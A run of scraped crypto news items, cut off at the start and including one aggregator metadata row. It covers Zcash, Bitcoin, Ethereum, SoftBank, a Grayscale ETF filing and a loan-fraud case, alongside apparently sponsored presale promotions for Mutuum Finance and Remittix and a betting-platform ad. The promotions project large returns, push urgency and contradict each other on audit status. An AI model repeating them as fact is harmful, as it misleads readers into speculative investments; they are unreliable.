deliver smart contract and DApp development. Phase 3 will bring the testnet, security reviews, and beta releases, while Phase 4 will mark the full launch, exchange listings, and multi-chain expansion. Each stage will build on the last to ensure a smooth, reliable rollout before mainnet deployment. Investors need to pay close attention to timing. You can obtain 285,700 MUTM tokens right now for $10,000. The next phase will commence when the price reaches $0.04, and that same holding will be worth $11,400. It might be worth $17,150 if it goes up to $0.06. Analysts think that the ecosystem will develop even more as it matures, based on their long-term predictions for a 50x run. This is the last chance to buy before the next price spike, which will happen soon when the price reaches $0.04. People are interested in Mutuum Finance (MUTM) not because it’s exciting, but because it has strong economics. It offers regular returns, contracts that have been checked, and a plan to repurchase MUTMs. In a market full of noise, this might be the best sign of where real DeFi value begins.

When analysts and AI models screen DeFi projects by growth potential, Mutuum Finance (MUTM) fits every strong metric. The ETH-based lending platform has drawn growing attention from investors tracking the most promising crypto investment opportunities of the season. A smart DeFi model that fits AI logic The presale of Mutuum Finance (MUTM) has already raised about $17 million. Total supply stands at 4B MUTM tokens. Phase 6 is live with 60% of its 170M-token supply sold at $0.035. The next price will rise to $0.040, marking a 15% increase. The project already has more than 16,800 holders. Mutuum Finance (MUTM) will build a decentralized lending protocol focused on ETH-based liquidity. It will combine two layers: Peer-to-Contract (P2C) and Peer-to-Peer (P2P). In P2C, users will deposit assets such as ETH or USDT into audited smart contracts. They will receive mtTokens in return, reflecting their share in the pool. These mtTokens will earn interest and will also serve as collateral to borrow. For instance, a lender who will deposit $15,000 USDT will receive mtUSDT 1:1 and earn a steady yield of around 15% APY. Borrowers will post collateral, such as ETH, and borrow stablecoins up to defined loan-to-value ratios. Every loan will stay overcollateralized, keeping the system stable. If collateral value drops below the safety level, an automated liquidation bot will act to secure the pool. P2P lending will cover more volatile assets, including meme coins. These tokens will stay isolated, protecting the core pool. Lenders in P2P will agree on rates and terms directly, creating a flexible market for higher-risk trades. At the heart of Mutuum Finance (MUTM)’s model is mtToken staking. Users who stake mtTokens will earn MUTM rewards. Platform revenue from borrowing fees and liquidations will fund token buybacks, which will be distributed to stakers. The CertiK audit will include manual review and static analysis, showing a TokenScan score of 90.00 and a Skynet score of 79.00. The audit timeline was first requested on February 25, 2025, and later revised to May 20, 2025. Mutuum Finance (MUTM)’s dashboard and leaderboard are live, and its community now exceeds 12,000 followers. As Phase 6 nears its close, investor urgency is rising fast. Stable interest, price discovery, and collateral logic The Stable Interest Rate Model will let borrowers lock in rates for predictable costs. The system will compare the stable rate to recent variable averages. When the supply rate drops to 90% or lower than the variable benchmark, it will rebalance automatically. Borrowers will accept slightly higher initial rates to avoid sudden cost changes. Only selected tokens will qualify for stable loans, ensuring safe exposure. Mutuum Finance (MUTM) will also enforce strong overcollateralization rules. Each position will be monitored by a Stability Factor, tracking the health of the collateral. When a loan triggers liquidation, part of the penalty will go to the protocol treasury. That treasury will become a key revenue source, supporting buybacks and staking rewards tied to MUTM. Price discovery will use Chainlink as the main oracle. Additional fallback feeds and DEX time-weighted averages will keep pricing consistent. This system will limit manipulation and keep liquidity providers safe. Reliable oracles will also help attract institutional funds that depend on precise data. Enhanced Collateral Efficiency (ECE) will improve borrowing power for correlated assets, such as ETH paired with wrapped ETH tokens. It will increase capital use without adding risk. More borrowing will mean higher fee income, which will flow back into the protocol and increase MUTM demand. Roadmap, revenue flow, and market outlook Mutuum Finance (MUTM) will follow a clear four-phase roadmap. Phase 1 will cover the presale, audits, and marketing foundation. Phases 2 to 4 will include contract development, front-end design, and the launch of beta and mainnet. The beta will launch close to the token listing, letting users test pool functions, borrowing logic, and staking flows in advance. Other than that, the Sepolia Testnet V1 will go live in Q4 2025 with modules such as Liquidity Pool, mtToken, Debt Token, and Liquidator Bot. Users will be able to lend, borrow, and use USDT and ETH as collateral in the system. Analysts are calling the project a “DeFi fit for AI logic.” The reasoning is simple: Mutuum Finance (MUTM)’s parameters—predictable yields, strong collateral safety, and clear revenue loops—match the data patterns AI models highlight when screening promising assets on crypto charts. In short, four things will keep demand strong over time. First, penalties for liquidation will go to the treasury, which will provide MUTM more authority to buy back tokens. Second, Enhanced Collateral Efficiency will securely increase volume. Third, limits on deposits and loans will make sure that institutions can regulate risk. Fourth, stable-rate borrowing will draw in treasuries that want payments that are easy to foresee. Each mechanism will help the total value locked and token demand keep going up. As Phase 6 sells out, experts think it will get more traction faster. Investors can connect their wallet to the Mutuum Finance (MUTM) dashboard to get their share before the next price step. Mutuum Finance (MUTM) passes every logical test for the next big DeFi success, and AI seems to agree.

The ZEC token has jumped from a low of $34 in August to $280, a 710% increase surge that has pushed its market capitalization to almost $4 billion. FOMO and Grayscale are driving the Zcash rally Zcash is a top cryptocurrency in the privacy space, where it competes with the likes of Dash and Monero. It does that by having two types of transactions: transparent and shielded. Transparent transactions are similar to Bitcoin in that they are available on a public ledger, while the shielded ones use zero-knowledge (zk) to ensure that transactions are private. In shielded transactions, information on the amount of money being sent and the addresses of the senders and recipients are keep hidden from the public view. The Zcash price has been in a strong uptrend since last year when Grayscale announced the launch of a fund tracking the coin. This fund will allow American investors to invest in it, and possibly opens the door for a spot ZEC ETF filing. The Zcash price has also jumped as that announcement triggered Fear of Missing Out (FOMO) among investors, which explains why it has continued rising. Data shows that the daily volume jumped by 90% to $1.4 billion, while the futures open interest soared to a record high of over $350 million. ZEC price has jumped because of the ongoing liquidations of short traders. Daily liquidations soared to $6.7 million on Friday from $4.69 million on the previous day. Altogether, shorts liquidations worth over 50 million has happened this week. The Zcash price rally has been notable as it happened in the same week that the crypto market crash occurred. Data shows that the market capitalization of all coins has plunged by over $200 billion this week. ZEC price technical analysis Zcash price chart | Source: TradingView There are technical reasons why the ZEC price soared this week. The daily timeframe chart shows that the coin’s price remained in a tight range between January and September. In this period, the token remained inside the resistance at $54 and the support at $28. As such, there are signs that the token was in the accumulation phase of the Wyckoff Theory, which is characterized by low volume and volatility. The chart shows that the Average True Range (ATR) continued to drop as the volatility plunged. The accumulation phase is then followed by the markup, which is characterized by high demand and a parabolic move. It is also characterized by the Fear of Missing Out (FOMO) among investors. Therefore, there is a risk that the ZEC price will crash as soon as it enter the markdown and the distribution phases. Besides, data shows that the coin has become highly overbought, with the Relative Strength Index (RSI) jumping to 80 and the Stochastic moving to nearly 100. A crash will likely bring the ZEC price to the important support level at $150, which is about 40% below the current level. It could also plunge below $100 as profit-taking intensifies.

Pi Network currently trades near $0.2326. However, its daily volume is going below $30 million. The project once had a multi-billion-dollar valuation, and right now it has dropped almost 90%. With sentiment weak, attention now turns to Protocol 23 and whether Pi Network can rebuild real activity in October. At the same time, emerging PayFi projects like Remittix (RTX) are drawing attention for offering tangible utility and growth potential, while Pi faces mounting pressure to prove its model. Pi Network: Can Protocol 23 Change the Path Pi Network trades near $0.2326. The price slump tracks thin demand and low on-chain use. Community voices on X say progress was slow and plans felt unclear, which kept new buyers away. Bears warn that without action on tokenomics, Pi Network could revisit $0.10. Two problems stand out: developer momentum has faded, and liquidity remains light, which both limit confidence. Protocol 23 could help if it lands cleanly. Aligned with Stellar Core v23.0.1, the upgrade targets scalability, efficiency, and security, plus DeFi tools like a DEX and AMM. Oversold RSI near 24 hints at a bounce, smaller unlocks, and recent moves to self-custody also help. Still, upgrades alone may not fix liquidity, so buybacks or coin burns could improve Pi Network incentives and trust. Remittix: The Under $1 Utility While traders debate Pi Network, many are adding Remittix as their under $1 utility pick. Remittix is a PayFi network where you send crypto, and the recipient gets fiat in a normal bank account, often within about 24 hours. Remittix price is currently at $0.1130. The project has sold over 676 million tokens, and it has raised more than $27.2 million as of now. The team is ranked #1 on CertiK, and the wallet beta is live, so anyone can test real transfers today. Why Remittix Is Standing Out Right Now Remittix is rewarding its global community through a live $250,000 giveaway on Gleam to celebrate the wallet beta launch. The project secured its first listing on BitMart after raising $20 million and its second on LBank after $22 million, with a third exchange in preparation. Ranked #1 on CertiK, Remittix gives investors trust that the project’s code and team are fully verified and protected. With over 676 million tokens sold and more than $27.2 million raised, Remittix shows real momentum ahead of broader adoption. Bottom Line: The Best Under $1 Altcoin To Buy Now Pi Network still has a chance if Protocol 23 delivers and tokenomics improve, but it must show real usage, not only plans. While you watch that progress, a practical hedge is a live utility with clear adoption data. With a $0.1130 price, #1 on CertiK, and a live wallet beta, Remittix is the best altcoin to buy now under $1 in October.

52931143,https://www.cryptopolitan.com/?p=832656,1760081050,https://resources.cryptocompare.com/news/43/52931143.jpeg,SoftBank in talks for $5B loan backed by Arm Stake to fund AI push,https://www.cryptopolitan.com/softbank-eyes-5b-arm-backed-loan/,"SoftBank Group Corp. is in advanced talks to secure a $5 billion loan from international banks, signaling the Japanese investment giant’s efforts to ease financial constraints around its nearly $100 billion Vision Fund following the economic impact of the COVID-19 pandemic. The loan would be backed by shares of Arm Holdings Plc, the British chip design firm controlled by SoftBank. Sources familiar with the matter, who requested anonymity due to the sensitivity of the discussions, said the deal is nearing completion and could be finalized in the coming weeks. The additional capital would allow SoftBank to increase its investments in OpenAI and other leading AI ventures. A SoftBank spokesperson declined to comment. Son Leverages Margin Loans to Fuel SoftBank’s AI Ambitions The loan is another bold play by Masayoshi Son, founder and chief executive officer of SoftBank, who has been vocal about wanting to turn the group into a powerhouse in the global AI revolution. The financing is structured as a margin loan, a mechanism that lets borrowers access cash by pledging securities. The financing is structured as a margin loan, a mechanism that allows borrowers to receive cash by using securities — in this case, ARM shares, which have surged by roughly 38% in 2025. The arrangement provides lenders with solid collateral while giving SoftBank additional flexibility to pursue its AI-focused strategy. Should the new facility be completed, it would increase the total amount borrowed on margin against the company’s stock to approximately $18.5 billion, compared with approximately $13.5 billion as of March 2025, according to its most recent financial filings. SoftBank has used this structure in the past. Before Arm’s blockbuster initial public offering (IPO) in 2023, the company borrowed about $8 billion in loans against its shares. Those facilities were structured, in part, by the biggest lenders — JPMorgan Chase & Co., Barclays Plc, BNP Paribas SA, Credit Agricole CIB, and Goldman Sachs Group Inc. The fresh $5 billion loan would be a piece of the larger wave of financing. In early 2025, SoftBank secured a $15 billion one-year loan, its largest to date, to fund AI investments in the United States. Son accelerates multibillion-dollar AI drive Masayoshi Son has also accelerated the pace of SoftBank’s investments this year as the 2025 target date approaches, setting the conglomerate up to become a global AI powerhouse. It’s the latest in a series of bold moves by Son, who has recently made promises to commit as much as $30 billion to OpenAI, the creator of ChatGPT, and completed a $5.4 billion purchase of ABB Ltd.’s robotics unit, further solidifying SoftBank’s stake in automation. Son’s vision revolves around Project Stargate , a $500 billion super-infrastructure plan he has designed with the help of OpenAI and Oracle Corporation. The goal is to build next-generation data centers nationwide that are equipped to meet the rapidly growing computing needs of AI systems. SoftBank is considering building a U.S.-based industrial center with large-capacity production lines for AI-powered robots and smart devices — a move that’s crucial to Son’s vision of integrating AI across all industries as he expands his empire. Financial market analysts, meanwhile, say these moves could change the SoftBank investment model. However, they also warn that Son’s aggressive borrowing is playing with fire. If market conditions change or demand for AI infrastructure cools, it could leave the company in very serious financial trouble. The enormous funding push at SoftBank is a symptom of a larger trend coursing through global finance. Big tech investors and large companies are pouring unprecedented amounts of money into AI, an area many believe has the potential to drive significant improvements in productivity, health, and manufacturing. The volume of debt connected to AI has ballooned to some $1.2 trillion, according to JPMorgan Chase, part of one of the world’s biggest markets for investment-grade credit. This explosion highlights the benefits and drawbacks of the AI boom, in which intertwining financing among companies like Nvidia, OpenAI, and SoftBank sparks concerns about asset bubbles and overleveraging.

According to its latest SEC filing , the trust soon to be renamed Grayscale Solana Trust ETF aims to list its shares on NYSE Arca under the ticker “GSOL.” This move reflects the company’s long-term strategy to convert its digital asset products into ETFs once regulatory conditions allow. Currently, GSOL trades on OTCQX, but listing on a national exchange would enhance liquidity and investor access. Grayscale Moves to Convert Solana Trust Into ETF The Delaware-based trust issues shares representing fractional beneficial ownership in its underlying Solana (SOL) holdings. Its goal is to mirror Solana’s market price, minus fees and liabilities. Each basket consists of 10,000 shares, created or redeemed by authorized participants. Fund operations currently depend on cash creations and redemptions, though Grayscale may transition to in-kind transactions once NYSE Arca secures approval. This adjustment would align GSOL with the structure already used by approved Bitcoin and Ethereum ETFs. The trust lists several key service providers. Coinbase Custody acts as the main custodian, Anchorage Digital Bank serves as an additional custodian, and The Bank of New York Mellon functions as the transfer agent and administrator. Davis Polk & Wardwell provides tax counsel, while Foreside Fund Services handles marketing operations. Staking Activation and Fee Structure Significantly, Grayscale recently enabled Solana staking within the trust, offering investors exposure to staking rewards through traditional brokerage accounts. The feature introduces new opportunities for yield generation but also adds technical risks. The filing warns that validators could face losses or reduced incentives, potentially affecting network stability. The ETF will charge a 0.35% sponsor fee, payable in SOL, with no current plan for a waiver. The trust clarified that fee adjustments could occur in future updates depending on market competition and operational costs. Rising Competition From Bitwise As reported by Coinpaper , Bitwise Asset Management has advanced its own Solana ETF proposal, emphasizing staking and cost efficiency. Its latest amendment to the SEC includes a reduced management fee of 0.20% among the lowest in the market and a temporary fee waiver until its first $1 billion in assets. Bloomberg analysts James Seyffart and Eric Balchunas noted that such pricing signals aggressive competition for early investor inflows. Analysts Watch $217 as Key Solana Support Source: X At the time of writing, Solana trades near $221 , down 2.9% in 24 hours, with a key support level at $217. Market analyst Ali Martinez emphasized that this level will determine Solana’s short-term trajectory, as a rebound could trigger a “W-shaped” recovery toward $226 and $236. A breakdown below $217, however, may lead to deeper corrections near $212.",News|Crypto,EN,0,0,CRYPTOCURRENCY|SOL|MARKET|BUSINESS|REGULATION,"{'name': 'Coinpaper', 'img': 'https://resources.cryptocompare.com/news/93/default.png', 'lang': 'EN'}",coinpaper,2025-10-10 07:29:02

The cryptocurrency is facing a slight pullback after hitting a new all-time high of $126k earlier this week. Leading altcoins, Ethereum (ETH) and XRP, followed BTC’s footsteps and faced correction, with both coins closing below their key support levels. The pullback suggests further downside risks, with the bulls expected to defend the $120k resistance level or face more dips in the coming hours and days. Spot Bitcoin ETFs record a strong week BTC hit a new all-time high earlier this week thanks to strong institutional demand for spot Bitcoin exchange-traded funds (ETFs). This week, Bitcoin ETFs have pulled in $2.72 billion in inflows. The massive inflow recorded by the ETFs suggests that institutions believe that Bitcoin serves as a digital hedge alongside gold. Despite the current pullback, traders remain bullish. In an email to Invezz, Dr. Sean Dawson, head of research at the onchain options platform Derive.xyz, stated that traders are preparing for a significant upside move. Dawson added that, A large cluster of BTC call options for the October 31 expiry is concentrated around the $128K and $145K strikes, pointing to bets on a $150K+ move before the month’s end. Bitcoin volatility is poised for a breakout. Implied volatilities across 14, 30, and 90-day expiries have surged to their highest levels in the past 30 days, pointing to increased anticipation of big moves ahead. The analyst added that traders are expecting a near-certain 25 basis point rate cut by the Federal Reserve later this month, with Polymarket odds currently sitting at 90%. Bitcoin could decline further if the price dips below $120,000 The BTC/USD 4-hour chart remains bearish and efficient, despite Bitcoin reaching an all-time high of $126k on Monday. The coin has failed to maintain the momentum since then and has now lost over 2% of its value, retesting the key $120k support level. At the time of writing, BTC is hovering around $121,600. The Relative Strength Index (RSI) on the 4H chart reads 48, falling from the overbought conditions on Monday, indicating a potential slowdown in its recent rally. The MACD lines are also close to the neutral zone and could slip into the negative territory, suggesting a bearish bias. If the correction continues, BTC risks closing below the $120k resistance and could extend its decline towards the next key support level at $116k. The bulls will likely defend the $116k support, as failure to do so could see BTC drop below $110k. However, if the $120k support level holds, Bitcoin could resume its upward momentum and reclaim the first liquidity zone at $124k.

In a market crowded with short-lived launches and empty promises, finding a project with real traction and clear utility is the exception, not the rule. That’s why many in the space are paying attention to Mutuum Finance (MUTM) . It isn’t a meme play destined to fade; it’s a utility-first project building a lending-and-borrowing protocol designed for everyday crypto users. The thesis is simple: strong fundamentals plus upcoming catalysts can create the kind of “pre-move” window that defined XRP’s early entry. What is Mutuum Finance Mutuum Finance is a decentralised lending and borrowing protocol set to launch on Ethereum. All activity settles on-chain via autonomous smart contracts, so users keep custody of their assets and transactions execute programmatically, no middlemen. What differentiates Mutuum is the way its pieces fit together: pooled and peer-to-peer lending markets, an interest-bearing mtToken model, and a fully over-collateralised stablecoin designed to hold a 1:1 USD peg. When you deposit assets, the protocol mints mtTokens, mtETH, mtUSDT, and so on, that mirror your balance and accrue yield over time. These tokens are your claim on the position: redeem them to receive the original asset plus the interest earned, or keep holding them and let the value compound. It’s a transparent, flexible way to earn on deposits while staying in control of your crypto. MUTM: The Native Utility Token At the core of the Mutuum ecosystem lies MUTM, the platform’s native ERC-20 utility token built on Ethereum. With a fixed supply of 4 billion tokens, 45% of the supply is currently available for purchase during the ongoing presale. MUTM is used as the main reward and utility asset within the protocol. When users deposit into the protocol, they receive mtTokens, which can then be staked to earn rewards. Through a buy-and-distribute mechanism, protocol revenue is used to purchase MUTM from the open market and distribute it to mtToken stakers, creating a sustainable and aligned incentive structure. The token is currently priced at $0.035, but this won’t last long. The presale is already 60% sold out, and the next phase will raise the price to $0.04, prompting many investors to buy in now. Those who participated in Phase 1 are already seeing over 250% gains, but it’s still early. Even at the current price, with a projected launch price of $0.06, buyers can expect nearly 2x returns. Some crypto analysts believe the listing price could exceed $0.06, as MUTM is set to launch on DEXs and multiple tier-1 and tier-2 CEXs, likely driving increased demand. To put it in perspective, a $2,500 investment in Phase 1 would now be worth approximately $8,750, a profit of $6,250 — and this is before the token officially launches. Recent Milestones and Protocol Launch The Mutuum team has confirmed via their official channels that development on the lending and borrowing protocol is progressing steadily. V1 is scheduled to launch on the Sepolia testnet in Q4 2025, marking a key milestone in the rollout. This testnet phase will validate the full architecture, give the community hands-on access, and initiate audits ahead of mainnet deployment. The mainnet launch will begin on Ethereum, supporting ETH and USDT for lending, borrowing, and collateralization. The V1 protocol includes all essential modules for a fully functional lending and borrowing system. Users will be able to deposit ETH or USDT and receive interest-bearing mtTokens, while borrowers can take loans based on live interest rates that adjust with market activity. A secure price oracle ensures accurate collateral valuations, and an automated liquidator protects the system by closing risky positions. Governance is handled by a 3-of-5 multisig with a 24-hour timelock, and part of the protocol fees will be used to buy MUTM from the market and reward stakers. The team will provide regular updates, show visible testnet progress, and selectively open-source non-sensitive modules to allow the community to track development in real time. As of today, Mutuum Finance has raised over $17 million and surpassed 16,800 MUTM holders, signaling strong momentum and community engagement ahead of launch. Conclusion With a fully designed protocol nearing testnet, listings planned across major exchanges, and over $17 million already raised, Mutuum is quickly establishing itself as a serious utility project in the crypto space. The current presale phase offers one of the last chances to secure MUTM tokens at $0.035 before the price increases. Early participants have already seen substantial returns, and with the token set to launch at $0.06 or higher, the window of opportunity is closing fast. As development milestones continue to be hit and demand grows, those who wait may find themselves entering at a much higher cost, or missing out entirely.

Ioannou also spent another £50,000 of illegally obtained Covid Bounce Back loan funds on payments to his ex-wife and cash withdrawals. The Insolvency Service confirmed on October 9 that the glazing firm’s boss had fraudulently applied for a second Bounce Back loan, bringing Opti-Bond (GB) Ltd’s total loan to £100K. According to the agency, Ioannou spent the first £50K loan properly on his glass-fitting business but squandered large amounts of the second loan on personal expenditures. The Southwark Crown Court also ordered the 49-year-old Ioannou, previously of South London, to pay £40K (~$53.2K) in restitution and work 150 hours without pay. Ioannou was also suspended from his position as a director for a period of five years. David Snasdell, Chief Investigator at the Insolvency Service, said the sole Opti-Bond (GB) Ltd director had no business spending on things that had nothing to do with his glazing firm. Ioannou transfers nearly £20K to his personal account Ioannou received £100,000 within eight days between late June and early July 2020 after making two separate £50,000 loan applications. He submitted the first application in May 2020, stating a £216,000 turnover for 2019. He then submitted a second application, stating a turnover of £236,000 for 2019. Haralambos Ioannou made almost 38 transactions, transferring £20,000 to his personal account. During the same period, Ioannou paid approximately £25,000 to gambling sites from his personal account and used an additional £8,000 to expand his cryptocurrency portfolio, alongside other investments. Ioannou also withdrew nearly £6,000 through ATMs and transferred another £16,000 to his ex-wife’s account. Snasdell condemned Ioannou for fraudulently applying for a second Bounce Back loan and exploiting a government-backed scheme that was a lifeline for many businesses during the pandemic. Every company was only entitled to one such loan. “He not only fraudulently applied for a second loan but then spent it on activities which had nothing to do with his company’s operations such as gambling, crypto-investments, cash withdrawals and payments to his then partner.” – David Snasdell , Chief Investigator at the Insolvency Service Snasdell warned that the agency is committed to strongly punishing those who exploit government-backed schemes for personal gain. He said the agency will continue to go after all those who deliberately abused the Covid-19 support at the expense of British taxpayers. The Insolvency Service insists Bounce Back loans must be repaid The Insolvency Service emphasized that all money lent to companies during the COVID-19 pandemic must be repaid within six to ten years. The repayments were supposed to start 12 months after the companies received the loans. The agency also warns that companies that fail to repay the Bounce Back loans will be investigated, even after they have been dissolved. If any misconduct is discovered, action may be taken against the company or its representatives. The loans were made on the condition that they were not to be spent for personal use. The agency disclosed that it will investigate misconduct, including falsifying loan application information and dissolving businesses to avoid loan repayments. It will also investigate whether other Covid-19-era assistance, such as the Eat Out to Help Out and Job Retention schemes, were used correctly. The Insolvency Service has clarified that companies breaching any government-backed schemes will either be wound up by the court or be required to compensate their creditors. Company directors will also be disqualified for varied periods depending on the specific cases. The agency revealed that two separate companies that submitted falsified documents to the government’s Bounce Back loan scheme were wound up by the court. Both companies secured around £230,000 worth of funding, including Bounce Back loans of £100,000. The investigation showed that the false documents were also submitted to 41 other local authorities.

As investors anticipate XRP’s long-awaited move toward $5, traders are also searching for earlier opportunities in projects with higher short-term upside. While XRP remains a favorite among long-term holders, analysts are now tracking a newer token that is quickly gaining traction — Mutuum Finance (MUTM) . Strong presale outlook The Mutuum Finance (MUTM) presale is currently in Phase 6 and has already generated around $17.05 million, combining all phases. The current price stands at $0.035, and more than 16,850 holders have joined the ecosystem so far since the presale began. About 60% of the 170 million tokens allocated for this phase are already sold. The total supply stands at 4 billion tokens. The team has confirmed that its lending and borrowing protocol V1 will launch on Sepolia Testnet in Q4 2025, including a Liquidity Pool, mtToken, Debt Token, and Liquidator Bot, with ETH and USDT set as the first assets for lending, borrowing, and collateral. How Mutuum Finance (MUTM) works Mutuum Finance (MUTM) is being developed to create a decentralized finance network that runs entirely through smart contracts. Its phased presale structure allows early investors to join before listings, with each stage offering slightly higher prices. This design rewards those who enter early and stay through launch. In Peer-to-Contract (P2C) lending, lenders will supply assets like ETH, BTC, or stablecoins to shared liquidity pools. These pools are managed by the protocol to generate real on-chain yield. For instance, a depositor who supplies $20,000 worth of ETH will receive 20,000 mtETH in return, maintaining a 1:1 ratio. With an average annual yield near 12%, this lender will earn $2,400 in one year. The rate depends on pool utilization. The more demand there is for borrowing, the higher the yield for lenders. Borrowers, on the other hand, will post collateral to unlock loans. For example, if a user deposits $2,000 worth of BTC as collateral, and BTC’s loan-to-value (LTV) ratio is 70%, they can borrow $1,400 in stablecoins. Interest will build per block, and borrowers can repay anytime as long as liquidity remains available. If the Stability Factor — an internal safety index — drops too low, the position will be automatically flagged for liquidation. Stability factor and liquidity controls The Stability Factor is calculated by tracking data from Chainlink price oracles, moving averages, volatility measures, and LTV ratios. When it falls below safe limits, the system begins partial liquidation instead of liquidating all at once. This method helps prevent large sell-offs and keeps the platform stable. The protocol also uses auction-style liquidations, where liquidators buy collateral at small discounts, clearing the debt while keeping market prices steady. During fast-moving markets, deep liquidity will play a vital role. When assets drop suddenly, larger liquidity pools help reduce slippage and avoid panic sales. For example, with an LTV of 75%, a 20% drop in collateral price in one day might trigger partial liquidation. The protocol responds by opening a controlled auction window and rewarding liquidators slightly more to cover the gap. This maintains balance and protects lenders. Security is another major focus. Mutuum Finance (MUTM) has already completed a CertiK audit with high scores. It has also launched a 50,000 USDT bug bounty program, offering rewards from $200 for low-level discoveries up to $2,000 for critical findings. Alongside this, the project is running a $100,000 giveaway that will select ten winners, each receiving $10,000 worth of MUTM tokens. The live Mutuum Finance (MUTM) dashboard lets users link their wallets, see their holdings, and figure out how much money they could make. The Top-50 leaderboard gives the biggest holders more MUTM tokens as a prize, which encourages people to take part. With 60% of Phase 6 now sold and the next phase poised to rise to $0.04, a 15% hike, Mutuum Finance (MUTM) looks primed to get a lot more investors. As crypto prices go up and down and traders get ready for the next XRP milestone, this project is one of the greatest tokens to keep an eye on for short-term gains and long-term value in the DeFi market.

Despite maintaining a strong mid-term uptrend, short-term momentum has weakened after a local bearish divergence and a recent market structure shift. The next few days will be key to determining whether this is just a healthy correction or the start of a deeper pullback. Technical Analysis By Shayan The Daily Chart On the daily timeframe, ETH remains inside a long-term ascending channel but has once again failed to break through the $4,800 resistance area. The asset is now dropping toward the channel’s lower trendline and the 100-day moving average at $4,000. The RSI has also cooled to 49, indicating that bullish momentum has faded for now but hasn’t turned bearish yet. As long as the structure holds above $4,000, the broader trend remains intact. However, losing that level could open the door for a deeper move toward $3,400, where the next significant demand zone lies. The 4-Hour Chart In the 4-hour view, ETH has confirmed a Market Structure Shift (MSS) after failing to sustain higher highs near $4,800. A clear bearish divergence on RSI supported this move, showing momentum loss before the drop. The price has now entered a short-term corrective phase and could revisit the $4,200–$4,100 zone, which aligns with previous demand. For buyers to regain control, ETH needs to reclaim $4,500 and invalidate the recent lower-high formation. Until then, short-term bias remains slightly bearish within the context of the broader bullish channel. Sentiment Analysis Open Interest Open interest across all exchanges remains elevated at around $28.5 billion, showing that derivatives traders are still heavily positioned despite the recent pullback. This suggests strong speculative interest, but it also means the market is vulnerable to liquidations if volatility increases. If open interest continues to stay high while price trends lower, it could trigger a cascade of forced long liquidations before a proper bottom forms. On the flip side, a gradual cooling of open interest during this correction would signal healthy resetting of leverage, potentially setting the stage for ETH’s next leg higher.

One platform for exchange betting, another for quick markets, a third for deep liquidity, each warranting a separate tab, separate wallet connection, and a separate experience altogether. But what if there was a single platform that could solve it all? Meet DGbet , the platform that transformed from a single sportsbook front‑end into a one‑stop hub for prediction markets via smart integrations with SXbets, Overtime Markets & Azuro! DGbet operates with just one vision, making on-chain betting easy, secure, and accessible to all! Here’s how it happens! The Web2 Bookmaker Problem Traditional Web2 sportsbooks come with a trifecta of problems: ban high-performing accounts, freeze funds during withdrawals, and delay payouts with “pending reviews.” Andy Green, a man from Lincolnshire won $1.7M at a renowned betting platform , but was denied his earnings for more than 2.5 years owing to “terms & conditions”. By partnering with decentralized protocols, DGbet eliminates these issues entirely. Smart contracts don’t judge sharpness, freeze accounts, or hold your funds, they simply execute without any intervention. Protocols settle directly to your wallet – no delays, no restrictions, no operator discretion. You’re not betting on a centralized platform’s terms. You’re betting on-chain, where the house doesn’t hold your funds. You do. Beyond EPL and NBA Most of the popular centralised books focus liquidity on top leagues: EPL, NBA, UFC. But what about esports? Table tennis? Regional football? Through the above mentioned collaborations, DGbet supports niche leagues, prop markets (total points/goals), and esports. In fact, across the last couple months, over $3 million in volume flowed through esports markets on DGbet, liquidity that traditional books couldn’t match. The more protocols integrated, the more markets unlocked. The Predictions Market Super App DGbet is shaping into a one stop shop of on-chain betting – abstracting protocols and routing users to the best liquidity. The team at DGbet is currently working on the introduction of prediction markets, thereby allowing the users to bet on not just sports, but anything and everything that has more than one outcome. Additionally, since you’re accessing multiple protocols through one interface, DGbet’s unified rewards system lets you earn across all of them. Our total rewards pool exceeds $500,000 annually, maximizing value in ways scattered platforms simply can’t. Check out DGbet’s deposit bonus that offers a 100% cashback on the first 5 bets placed by every new user!

ZEC is now above $260, and is starting to affect other privacy coins. ZCash (ZEC) broke to a higher range, revisiting prices not seen since 2018. It added another 53% for the past day to over $260. ZEC remained the leader of the privacy coin narrative, driven by its older claims to solving the privacy issues of BTC. ZEC broke out above $260, mostly caused by a derivative short squeeze. The privacy narrative is gaining strength, with more potential rallies for all related assets. | Source: CoinGecko . The recent price rally considers ZEC in the same class as BTC , possibly commanding a much higher price. ZEC still faced resistance at $290, after clearing the $280 level briefly. The token has been taken up for derivative trading, causing the recent price rally as a short squeeze. The currently traded ZEC is locked on exchanges, and does not reflect immediate adoption and usage. ZEC revives privacy coin speculation The ZEC rally spread over to other privacy assets, all performing similar rallies after years of relatively low activity. The bull cycle affected privacy coins, as the narrative returned after years of problems, mostly related to listings on exchanges. The entire privacy coin market expanded by over 17% on average for the past week, for a total valuation above $13B. Previously, XMR attempted to bring attention to the sector, but only achieved a solitary rally. XMR is now lagging, still at around $336. Over the course of 2025, privacy coins expanded more slowly, becoming the top narrative. The recent rally showed more undervalued assets attempted to catch up. ZEC unlocks privacy season for multiple assets The effect of ZEC was linked to its promoters, as the token was mentioned by Naval Ravikant and top crypto influential accounts. The ZEC effect spilled over, boosting other privacy coins. Railgun (RAIL) extended its rally, growing by 116% in the past day to $5.12. Even ‘dinosaur coins’ are back to the forefront. Litecoin (LTC) broke above $130 once again, as the asset is now considered a privacy coin due to its MimbleWimble technology. LTC traded at around $129.25 ahead of the weekend. One of the previously forgotten privacy coins was DASH. The asset recovered to $43.81, the highest level in three months. The DASH rally is still relatively small, though the token added over 101% to its price overnight. Decred (DCR) had a smaller rally, adding around 13% overnight to $20.32. The privacy coin rally did not only boost older projects. Even recently added tokens like Veil Coin had vertical rallies to reach close to their price records. Unlike memes, privacy projects are more development-intensive, and new assets cannot be easily forked. Some of the tokens were also created with a small or fixed supply. However, the recent rally is yet to show if there will be organic usage for payments or transfers. Currently, most of the rapid price expansion is due to shifts in derivative trading. For ZEC, this means the rally may be exhausted, with a possible dip to $200 to liquidate long positions.

